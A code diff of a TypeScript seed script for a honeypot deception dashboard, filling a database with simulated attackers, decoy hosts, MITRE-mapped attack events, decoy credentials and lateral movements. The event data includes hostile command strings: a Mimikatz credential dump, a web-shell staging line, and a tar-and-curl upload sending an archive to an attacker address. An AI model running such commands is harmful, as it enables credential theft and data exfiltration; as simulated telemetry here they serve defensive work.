@@ -1,220 +1,252 @@
 import mongoose from 'mongoose';
-import { Attacker, AttackEvent, Credential, DecoyHost, LateralMovement } from '../models';
 import { v4 as uuidv4 } from 'uuid';
-import moment from 'moment';
+import {
+  Attacker,
+  AttackEvent,
+  Credential,
+  DecoyHost,
+  LateralMovement,
+  VMStatus
+} from '../models';
+import { logger } from './logger';
 
 const MONGODB_URI = process.env.MONGODB_URI || 'mongodb://localhost:27017/maya_deception';
 
-async function seedDatabase() {
+const minutesAgo = (minutes: number) => new Date(Date.now() - minutes * 60 * 1000);
+const randomInt = (min: number, max: number) => Math.floor(Math.random() * (max - min + 1)) + min;
+
+const attackers = [
+  {
+    attackerId: 'attacker-10-20-20-100',
+    ipAddress: '10.20.20.100',
+    campaign: 'Shadow Hydra',
+    currentPrivilege: 'Admin',
+    entryPoint: 'fake-web-01',
+    riskLevel: 'Critical' as const,
+    dwellTime: 145,
+    threatConfidence: 95,
+    tools: ['nmap', 'metasploit', 'mimikatz']
+  },
+  {
+    attackerId: 'attacker-10-20-20-150',
+    ipAddress: '10.20.20.150',
+    campaign: 'Iron Veil',
+    currentPrivilege: 'User',
+    entryPoint: 'fake-ftp-01',
+    riskLevel: 'High' as const,
+    dwellTime: 38,
+    threatConfidence: 72,
+    tools: ['hydra', 'curl', 'ftp']
+  },
+  {
+    attackerId: 'attacker-10-20-20-200',
+    ipAddress: '10.20.20.200',
+    campaign: 'Ghost Pulse',
+    currentPrivilege: 'Root',
+    entryPoint: 'fake-jump-01',
+    riskLevel: 'Critical' as const,
+    dwellTime: 210,
+    threatConfidence: 88,
+    tools: ['ssh', 'smbclient', 'rsync']
+  }
+];
+
+const techniques = [
+  {
+    stage: 'INITIAL_ACCESS' as const,
+    type: 'Initial Access' as const,
+    tactic: 'initial-access',
+    tacticId: 'TA0001',
+    tacticName: 'Initial Access',
+    technique: 'T1078',
+    techniqueName: 'Valid Accounts',
+    description: 'Valid account login accepted by decoy service',
+    command: 'ssh admin@fake-web-01',
+    severity: 'High' as const
+  },
+  {
+    stage: 'LATERAL_MOVEMENT' as const,
+    type: 'Lateral Movement' as const,
+    tactic: 'lateral-movement',
+    tacticId: 'TA0008',
+    tacticName: 'Lateral Movement',
+    technique: 'T1021',
+    techniqueName: 'Remote Services',
+    description: 'Remote service pivot between decoy hosts',
+    command: 'ssh -J fake-web-01 fake-jump-01',
+    severity: 'High' as const
+  },
+  {
+    stage: 'CREDENTIAL_ACCESS' as const,
+    type: 'Credential Theft' as const,
+    tactic: 'credential-access',
+    tacticId: 'TA0006',
+    tacticName: 'Credential Access',
+    technique: 'T1003',
+    techniqueName: 'OS Credential Dumping',
+    description: 'Credential dump attempted against decoy host',
+    command: 'mimikatz sekurlsa::logonpasswords',
+    severity: 'Critical' as const
+  },
+  {
+    stage: 'OTHER' as const,
+    type: 'Persistence' as const,
+    tactic: 'persistence',
+    tacticId: 'TA0003',
+    tacticName: 'Persistence',
+    technique: 'T1505',
+    techniqueName: 'Server Software Component',
+    description: 'Web shell component staged on fake web server',
+    command: 'echo shell.php > /var/www/html/upload.php',
+    severity: 'High' as const
+  },
+  {
+    stage: 'EXFILTRATION' as const,
+    type: 'Data Exfiltration' as const,
+    tactic: 'exfiltration',
+    tacticId: 'TA0010',
+    tacticName: 'Exfiltration',
+    technique: 'T1041',
+    techniqueName: 'Exfiltration Over C2 Channel',
+    description: 'Decoy archive exfiltration attempted over command channel',
+    command: 'tar czf - /srv/share | curl -X POST http://10.20.20.100/upload --data-binary @-',
+    severity: 'Critical' as const
+  }
+];
+
+export async function seedDatabase(): Promise<void> {
   try {
-    await mongoose.connect(MONGODB_URI);
-    console.log('Connected to MongoDB');
+    const existingAttackers = await Attacker.countDocuments();
+    if (existingAttackers > 0) {
+      logger.info('Seed data already present, skipping simulation seed');
+      return;
+    }
 
-    await Promise.all([
-      Attacker.deleteMany({}),
-      AttackEvent.deleteMany({}),
-      Credential.deleteMany({}),
-      DecoyHost.deleteMany({}),
-      LateralMovement.deleteMany({})
+    await DecoyHost.insertMany([
+      { hostId: 'decoy-gateway-vm', hostname: 'gateway-vm', ipAddress: '10.20.20.1', segment: 'DMZ', os: 'Linux', services: ['nat', 'iptables'], status: 'Active', deploymentType: 'VM', interactions: 12, attackerIds: [], mitreTechniques: ['T1078'] },
+      { hostId: 'decoy-fake-jump-01', hostname: 'fake-jump-01', ipAddress: '10.20.20.10', segment: 'Jump', os: 'Linux', services: ['ssh'], status: 'Under Attack', deploymentType: 'VM', interactions: 31, attackerIds: ['attacker-10-20-20-100', 'attacker-10-20-20-200'], mitreTechniques: ['T1021', 'T1003'] },
+      { hostId: 'decoy-fake-web-01', hostname: 'fake-web-01', ipAddress: '10.20.20.20', segment: 'DMZ', os: 'Linux', services: ['nginx', 'ssh'], status: 'Compromised', deploymentType: 'VM', interactions: 46, attackerIds: ['attacker-10-20-20-100'], mitreTechniques: ['T1078', 'T1505'] },
+      { hostId: 'decoy-fake-web-02', hostname: 'fake-web-02', ipAddress: '10.20.20.21', segment: 'DMZ', os: 'Linux', services: ['nginx'], status: 'Active', deploymentType: 'VM', interactions: 18, attackerIds: [], mitreTechniques: ['T1505'] },
+      { hostId: 'decoy-fake-ftp-01', hostname: 'fake-ftp-01', ipAddress: '10.20.20.30', segment: 'DMZ', os: 'Linux', services: ['ftp'], status: 'Under Attack', deploymentType: 'VM', interactions: 24, attackerIds: ['attacker-10-20-20-150'], mitreTechniques: ['T1078'] },
+      { hostId: 'decoy-fake-rdp-01', hostname: 'fake-rdp-01', ipAddress: '10.20.20.40', segment: 'Internal', os: 'Windows', services: ['rdp'], status: 'Active', deploymentType: 'VM', interactions: 9, attackerIds: [], mitreTechniques: ['T1021'] },
+      { hostId: 'decoy-fake-smb-01', hostname: 'fake-smb-01', ipAddress: '10.20.20.50', segment: 'Internal', os: 'Windows', services: ['smb'], status: 'Active', deploymentType: 'VM', interactions: 14, attackerIds: ['attacker-10-20-20-200'], mitreTechniques: ['T1021', 'T1041'] }
     ]);
-    console.log('Cleared existing data');
 
-    const decoys = [
-      { hostId: 'decoy-web-01', hostname: 'fake-web-01', ipAddress: '192.168.10.241', segment: 'DMZ', os: 'Linux', services: ['nginx', 'ssh'], deploymentType: 'VM' },
-      { hostId: 'decoy-web-02', hostname: 'fake-web-02', ipAddress: '192.168.10.242', segment: 'DMZ', os: 'Linux', services: ['nginx', 'mysql'], deploymentType: 'VM' },
-      { hostId: 'decoy-ftp-01', hostname: 'fake-ftp-01', ipAddress: '192.168.10.243', segment: 'DMZ', os: 'Linux', services: ['vsftpd'], deploymentType: 'VM' },
-      { hostId: 'decoy-redis-01', hostname: 'fake-redis-01', ipAddress: '192.168.10.244', segment: 'Database', os: 'Linux', services: ['redis'], deploymentType: 'VM' },
-      { hostId: 'decoy-jump-01', hostname: 'fake-jump-01', ipAddress: '192.168.10.245', segment: 'Jump', os: 'Linux', services: ['ssh'], deploymentType: 'VM' },
-      { hostId: 'decoy-rdp-01', hostname: 'fake-rdp-01', ipAddress: '192.168.10.246', segment: 'Internal', os: 'Windows', services: ['rdp', 'smb'], deploymentType: 'VM' }
-    ];
-
-    await DecoyHost.insertMany(decoys);
-    console.log('Created decoy hosts');
-
-    const attackers = [
-      {
-        attackerId: 'APT-192-168-1-100',
-        ipAddress: '192.168.1.100',
-        entryPoint: 'fake-web-01',
-        currentPrivilege: 'Admin',
-        riskLevel: 'Critical',
-        campaign: 'Shadow Hydra',
-        firstSeen: moment().subtract(2, 'hours').toDate(),
-        lastSeen: moment().subtract(5, 'minutes').toDate(),
-        dwellTime: 120,
-        status: 'Active',
-        geolocation: { country: 'Unknown', city: 'Tor Exit Node', coordinates: [0, 0] },
-        fingerprint: { userAgent: 'Mozilla/5.0', os: 'Linux', tools: ['nmap', 'metasploit'] }
-      },
-      {
-        attackerId: 'APT-10-0-0-50',
-        ipAddress: '10.0.0.50',
-        entryPoint: 'fake-ftp-01',
-        currentPrivilege: 'User',
-        riskLevel: 'High',
-        campaign: 'Opportunistic',
-        firstSeen: moment().subtract(5, 'hours').toDate(),
-        lastSeen: moment().subtract(30, 'minutes').toDate(),
-        dwellTime: 90,
-        status: 'Active',
-        fingerprint: { userAgent: 'curl/7.68.0', os: 'Windows', tools: ['hydra'] }
+    await Attacker.insertMany(attackers.map((attacker, index) => ({
+      attackerId: attacker.attackerId,
+      ipAddress: attacker.ipAddress,
+      entryPoint: attacker.entryPoint,
+      currentPrivilege: attacker.currentPrivilege,
+      riskLevel: attacker.riskLevel,
+      campaign: attacker.campaign,
+      firstSeen: minutesAgo(attacker.dwellTime),
+      lastSeen: minutesAgo(index * 8 + 4),
+      dwellTime: attacker.dwellTime,
+      status: 'Active',
+      geolocation: { country: 'Unknown', city: 'Simulated Source', coordinates: [0, 0] },
+      fingerprint: {
+        userAgent: `MayaSim/${attacker.threatConfidence}`,
+        os: index === 1 ? 'Windows' : 'Linux',
+        tools: attacker.tools
       }
-    ];
+    })));
 
-    await Attacker.insertMany(attackers);
-    console.log('Created sample attackers');
+    const events = attackers.flatMap((attacker, attackerIndex) => {
+      const eventCount = attackerIndex === 0 ? 8 : attackerIndex === 1 ? 5 : 6;
+      return Array.from({ length: eventCount }, (_, eventIndex) => {
+        const technique = techniques[eventIndex % techniques.length];
+        const targetHost = ['fake-web-01', 'fake-jump-01', 'fake-db-01', 'fake-ftp-01', 'fake-smb-01'][eventIndex % 5];
 
-    const events = [
-      {
-        eventId: `evt-${uuidv4()}`,
-        timestamp: moment().subtract(2, 'hours').toDate(),
-        attackerId: 'APT-192-168-1-100',
-        type: 'Initial Access',
-        technique: 'T1078',
-        tactic: 'Initial Access',
-        description: 'Initial Access: Phishing Email',
-        sourceHost: '192.168.1.100',
-        targetHost: 'fake-web-01',
-        severity: 'High',
-        status: 'Detected'
-      },
-      {
-        eventId: `evt-${uuidv4()}`,
-        timestamp: moment().subtract(1, 'hours').subtract(45, 'minutes').toDate(),
-        attackerId: 'APT-192-168-1-100',
-        type: 'Credential Theft',
-        technique: 'T1003',
-        tactic: 'Credential Access',
-        description: 'Credential Theft: admin_user',
-        sourceHost: 'fake-web-01',
-        targetHost: 'fake-web-01',
-        command: 'mimikatz.exe',
-        severity: 'Critical',
-        status: 'Detected'
-      },
-      {
-        eventId: `evt-${uuidv4()}`,
-        timestamp: moment().subtract(1, 'hours').subtract(15, 'minutes').toDate(),
-        attackerId: 'APT-192-168-1-100',
-        type: 'Lateral Movement',
-        technique: 'T1021',
-        tactic: 'Lateral Movement',
-        description: 'Lateral Movement: to Decoy Server 2',
-        sourceHost: 'fake-web-01',
-        targetHost: 'fake-jump-01',
-        severity: 'High',
-        status: 'In Progress'
-      },
-      {
-        eventId: `evt-${uuidv4()}`,
-        timestamp: moment().subtract(48, 'minutes').toDate(),
-        attackerId: 'APT-192-168-1-100',
-        type: 'Command Execution',
-        technique: 'T1059',
-        tactic: 'Execution',
-        description: 'Command Executed: Mimikatz Dump',
-        sourceHost: 'fake-jump-01',
-        targetHost: 'fake-jump-01',
-        command: 'sekurlsa::logonpasswords',
-        severity: 'Critical',
-        status: 'Detected'
-      },
-      {
-        eventId: `evt-${uuidv4()}`,
-        timestamp: moment().subtract(20, 'minutes').toDate(),
-        attackerId: 'APT-192-168-1-100',
-        type: 'Data Exfiltration',
-        technique: 'T1041',
-        tactic: 'Exfiltration',
-        description: 'Data Exfiltration Attempt',
-        sourceHost: 'fake-redis-01',
-        targetHost: '192.168.1.100',
-        severity: 'Critical',
-        status: 'Blocked'
-      }
-    ];
-
+        return {
+          eventId: `evt-${uuidv4()}`,
+          timestamp: minutesAgo(attacker.dwellTime - eventIndex * 12),
+          attackerId: attacker.attackerId,
+          stage: technique.stage,
+          type: technique.type,
+          description: `${technique.description}: ${attacker.campaign}`,
+          sourceHost: eventIndex === 0 ? attacker.ipAddress : attacker.entryPoint,
+          targetHost,
+          command: technique.command,
+          severity: eventIndex > 2 && attacker.riskLevel === 'Critical' ? 'Critical' : technique.severity,
+          status: eventIndex === eventCount - 1 ? 'In Progress' : 'Detected',
+          tactic: technique.tactic,
+          tacticId: technique.tacticId,
+          tacticName: technique.tacticName,
+          technique: technique.technique,
+          techniqueName: technique.techniqueName,
+          techniqueDescription: technique.description,
+          isSubtechnique: false,
+          mitreConfidence: Math.min(attacker.threatConfidence / 100, 0.98),
+          classificationMethod: 'manual',
+          allMatchingTechniques: [technique.technique],
+          commandPatternMatched: technique.command.split(' ')[0],
+          navigatorScore: attacker.threatConfidence,
+          metadata: {
+            processName: technique.command.split(' ')[0],
+            userContext: attacker.currentPrivilege.toLowerCase()
+          }
+        };
+      });
+    });
     await AttackEvent.insertMany(events);
-    console.log('Created attack events');
 
     const credentials = [
-      {
-        credentialId: `cred-${uuidv4()}`,
-        username: 'admin_user',
-        password: 'Summer2024!',
-        source: 'fake-web-01',
-        attackerId: 'APT-192-168-1-100',
-        decoyHost: 'fake-web-01',
-        timestamp: moment().subtract(1, 'hours').subtract(45, 'minutes').toDate(),
-        usageCount: 3,
-        lastUsed: moment().subtract(20, 'minutes').toDate(),
-        status: 'Used',
-        riskScore: 85
-      },
-      {
-        credentialId: `cred-${uuidv4()}`,
-        username: 'db_service',
-        password: 'DbP@ssw0rd123',
-        source: 'fake-redis-01',
-        attackerId: 'APT-192-168-1-100',
-        decoyHost: 'fake-redis-01',
-        timestamp: moment().subtract(30, 'minutes').toDate(),
-        usageCount: 1,
-        status: 'Stolen',
-        riskScore: 90
-      },
-      {
-        credentialId: `cred-${uuidv4()}`,
-        username: 'backup_account',
-        password: 'Backup2024!',
-        source: 'fake-ftp-01',
-        attackerId: 'APT-10-0-0-50',
-        decoyHost: 'fake-ftp-01',
-        timestamp: moment().subtract(3, 'hours').toDate(),
-        usageCount: 0,
-        status: 'Stolen',
-        riskScore: 75
-      }
+      { username: 'svc_backup', password: 'Backup2026!', protocol: 'SSH', attackerId: attackers[0].attackerId, decoyHost: 'fake-web-01', riskScore: 93 },
+      { username: 'ftp_deploy', password: 'DeployMe123', protocol: 'FTP', attackerId: attackers[1].attackerId, decoyHost: 'fake-ftp-01', riskScore: 77 },
+      { username: 'corp\\filesvc', password: 'Spring2026#', protocol: 'SMB', attackerId: attackers[2].attackerId, decoyHost: 'fake-smb-01', riskScore: 88 },
+      { username: 'administrator', password: 'P@ssw0rd!2026', protocol: 'RDP', attackerId: attackers[0].attackerId, decoyHost: 'fake-rdp-01', riskScore: 96 }
     ];
+    await Credential.insertMany(credentials.map(credential => ({
+      credentialId: `cred-${uuidv4()}`,
+      username: credential.username,
+      password: credential.password,
+      source: credential.protocol,
+      attackerId: credential.attackerId,
+      decoyHost: credential.decoyHost,
+      timestamp: minutesAgo(randomInt(10, 120)),
+      usageCount: randomInt(0, 4),
+      lastUsed: minutesAgo(randomInt(4, 40)),
+      status: 'Stolen',
+      riskScore: credential.riskScore
+    })));
 
-    await Credential.insertMany(credentials);
-    console.log('Created credentials');
+    await LateralMovement.insertMany([
+      { movementId: `mov-${uuidv4()}`, attackerId: attackers[0].attackerId, timestamp: minutesAgo(110), sourceHost: 'fake-web-01', targetHost: 'fake-jump-01', technique: 'T1021', method: 'SSH', successful: true, credentialsUsed: 'svc_backup' },
+      { movementId: `mov-${uuidv4()}`, attackerId: attackers[0].attackerId, timestamp: minutesAgo(92), sourceHost: 'fake-jump-01', targetHost: 'fake-db-01', technique: 'T1021', method: 'SSH', successful: true, credentialsUsed: 'administrator' },
+      { movementId: `mov-${uuidv4()}`, attackerId: attackers[2].attackerId, timestamp: minutesAgo(64), sourceHost: 'fake-jump-01', targetHost: 'fake-smb-01', technique: 'T1021', method: 'SMB', successful: true, credentialsUsed: 'corp\\filesvc' }
+    ]);
 
-    const movements = [
-      {
-        movementId: `mov-${uuidv4()}`,
-        attackerId: 'APT-192-168-1-100',
-        timestamp: moment().subtract(1, 'hours').subtract(15, 'minutes').toDate(),
-        sourceHost: 'fake-web-01',
-        targetHost: 'fake-jump-01',
-        technique: 'T1021.004',
-        method: 'SSH',
-        successful: true
+    const vmNames = ['gateway-vm', 'fake-jump-01', 'fake-web-01', 'fake-web-02', 'fake-ftp-01', 'fake-rdp-01', 'fake-smb-01'];
+    await VMStatus.insertMany(vmNames.map((vmName, index) => ({
+      vmName,
+      hostname: vmName,
+      status: 'running',
+      ip: `10.20.20.${index === 0 ? 1 : index * 10}`,
+      lastSeen: new Date(),
+      crdtState: {
+        attackers: index % 3,
+        credentials: index % 2,
+        sessions: randomInt(1, 5),
+        hash: uuidv4().replace(/-/g, '').slice(0, 12)
       },
-      {
-        movementId: `mov-${uuidv4()}`,
-        attackerId: 'APT-192-168-1-100',
-        timestamp: moment().subtract(45, 'minutes').toDate(),
-        sourceHost: 'fake-jump-01',
-        targetHost: 'fake-redis-01',
-        technique: 'T1021.002',
-        method: 'SMB',
-        successful: true
-      }
-    ];
+      dockerContainers: [{
+        id: uuidv4().replace(/-/g, '').slice(0, 12),
+        name: 'cowrie',
+        image: 'cowrie/cowrie:latest',
+        status: 'running',
+        ports: ['22/tcp'],
+        created: new Date().toISOString()
+      }]
+    })));
 
-    await LateralMovement.insertMany(movements);
-    console.log('Created lateral movements');
-
-    console.log('\n✅ Database seeded successfully!');
-    console.log('You can now start the dashboard and see sample data.');
-    
+    logger.info('Seed data inserted successfully');
   } catch (error) {
-    console.error('Error seeding database:', error);
-  } finally {
-    await mongoose.connection.close();
-    process.exit(0);
+    logger.error('Error seeding database:', error);
   }
 }
 
-seedDatabase();
+if (require.main === module) {
+  mongoose.connect(MONGODB_URI)
+    .then(() => seedDatabase())
+    .finally(() => mongoose.connection.close());
+}
